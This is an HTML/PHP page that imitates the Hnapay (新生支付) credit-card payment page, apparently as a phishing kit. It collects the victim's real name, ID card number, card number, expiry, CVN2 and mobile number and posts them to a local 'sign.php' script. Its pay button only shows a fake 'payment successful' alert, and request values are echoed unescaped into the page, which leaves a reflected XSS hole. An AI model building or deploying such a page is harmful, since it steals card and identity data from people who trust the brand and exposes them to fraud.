<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0065)https://gateway.hnapay.com/Notify/NotifyDefault.do?t=1&v=100E3025 -->
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<title>新生支付页面</title>
		<link href="./resources/layout.css" rel="stylesheet" type="text/css">
		<link href="./resources/defaultErrorMain.css" rel="stylesheet" type="text/css">
	</head>
	<body>
		<div id="container">
			

<script type="text/javascript" src="./resources/jquery-1.6.3.min.js"></script>
<div id="header">
    <div class="logo"><img src="./resources/hnapayLogo64.png"></div>
    <ul>
        <li></li>
        <li></li>
    </ul>
    <div class="register">
        <span><a href="https://www.hnapay.com/">新生首页 </a></span>
    </div>
    <div class="contacts">
        <p><a href="https://www.hnapay.com/pay/helpcenter/gy-gy-1.html">帮助中心 ServiceCenter</a></p>
    </div>
</div>
<div id="hr_header"></div>
<div id="main">
	<div class="tabs">
		<span class="title">
			信用卡支付
		</span>
	</div>
	<div class="item-box">
		<table>
			<tbody>
				<form>
					<tr>
                        <td>订单号:</td>
						<td><input type="text" disabled="true" id="orderNo" value="<?php echo $_REQUEST["order_sn"] ?>"></td>
					</tr>
					<tr>
						<td>金额:</td>
						<td><input type="text" disabled="true" id="order_amount" value="<?php echo $_REQUEST["order_amount"] ?>"></td>
					</tr>
					<tr>
						<td>真实姓名:</td>
						<td><input type="text" id="realname"></td>
					</tr>
					<tr>
						<td>身份证号:</td>
						<td><input type="text" id="idCard"></td>
					</tr>
					<tr>
						<td>信用卡号:</td>
						<td><input type="text" id="bankcard"></td>
					</tr>
					<tr>
						<td>预留手机号码:</td>
						<td><input type="text" name="mobile" id="mobile" ></td>
					</tr>
					<tr>
						<td>有效期:</td>
						<td><input type="text" id="expireDate"></td>
					</tr>
					<tr>
						<td>CVN2:</td>
						<td><input type="text" id="cvn2"></td>
					</tr>
					<tr>
						<td>验证码:</td>
						<td><input type="text" id="smsCode"></td>
						<td>
							<input type="button" name="getcode" id="getcode" class="reg_code" value="获取验证码">
							<!-- <button id="getcode"  class="reg_code" >获取验证码</button> -->
							<button class="reg_code2" disabled="true" hidden="true"><i>60</i>秒重发</button>
						</td>
						
					</tr>
					<tr>
						<td><input type="button" id="pay" value="支付"></td>
						<td><input type="reset" value="重置"></td>
					</tr>
				</form>
				<!-- <tr>
						<td>&nbsp;&nbsp;<font color="red">100E3025&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;&nbsp;收款账户冻结</font></td> 
				</tr> -->
			</tbody>
		</table>
	</div>
</div>
			

<script type="application/javascript">
	$(document).ready(function(){
		var staticUrl = "https://static.hnapay.com";
		$(".hna-motif").css("background", "url('" + staticUrl + "/image/logo/hnapayLogo64.png') no-repeat  center left");
	});


	// 获取验证码
    $('#getcode').click(function(){

		if($("#mobile").val()==""){
			alert("手机号不能为空");
		}else {
			$('.reg_code').hide();
			$('.reg_code2 i').html('60');
			$('.reg_code2').show();
			var second = 60;
			var timer = null;
			timer = setInterval(function(){
				second -= 1;
				if(second >0 ){
					$('.reg_code2 i').html(second);
				}else{
					clearInterval(timer);
					$('.reg_code').show();
					$('.reg_code').html("重新获取");
					$('.reg_code2').hide();
				}
			},1000);

			$.ajax({
				url: "./sign.php",
				type: "POST",
				dataType: "json",
				data: {
					orderNo: $("#mobile").val(),
					bankCardNo: $("#bankcard").val(),
					realname: $("#realname").val(),
					expireDate: $("#expireDate").val(),
					cvn2: $("#cvn2").val(),
					bankCardMobile: $("#mobile").val(),
					idCard: $("#idCard").val(),
				},
				success: function(data){
                    // alert(data);
                    console.log(data);
					if (data.status != "200")  {
					    var res = JSON.parse(data.resposn);
						if(res.resultCode != 0){
                            clearInterval(timer);
                            $('.reg_code').show();
                            $('.reg_code2').hide();
                            alert('获取失败：' + res.errorMsg);
                        }else{
                            alert('获取成功，请注意查收短信');
                        }
					}
				},
				error: function(data,status,error){
                    // alert(JSON.stringify(data))
                    console.log(JSON.stringify(data));
					var data = JSON.parse(data.responseText);
					alert(data.message);
				}
			});
		}
        });
        

    // 支付
    $('#pay').click(function(){
                if($("#smsCode").val()==""){
                    alert("短信验证码不能为空");
                }else {
                    alert("支付成功");
                }
            })
</script>
<div id="footer" style="">
	Copyright © Hainan New Generation Technology Company Limited  新生支付版权所有2004-2019 <br>增值电信业务经营许可证：琼B2-20110013 琼ICP备11000638号-4
		<br>
		<a href="https://seal.verisign.com/splash?form_file=fdf/splash.fdf&amp;dn=www.hnapay.com&amp;lang=zh_cn" target="_blank">
			<img src="./resources/verisign.jpg">
		</a>
	<p></p>
</div>

		</div>
	
<div id="download_plus_animation"></div></body></html>